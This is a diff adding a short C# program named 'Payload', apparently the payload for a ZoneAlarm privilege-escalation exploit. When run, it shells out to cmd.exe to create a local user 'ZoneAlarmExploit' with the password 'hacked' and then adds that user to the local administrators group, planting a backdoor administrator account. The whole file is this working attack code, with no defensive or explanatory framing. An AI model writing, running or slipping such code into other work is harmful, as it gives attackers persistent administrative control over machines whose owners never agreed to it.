@@ -1,0 +1,24 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Payload {
+    class Program {
+        static void Main(string[] args) {
+
+            Process p = new Process();
+
+            //create new user
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c net user /add ZoneAlarmExploit hacked";
+            p.Start();
+
+            //add new user to local administrators group
+            p.StartInfo.Arguments = "/c net localgroup administrators ZoneAlarmExploit /add";
+            p.Start();
+        }
+    }
+}
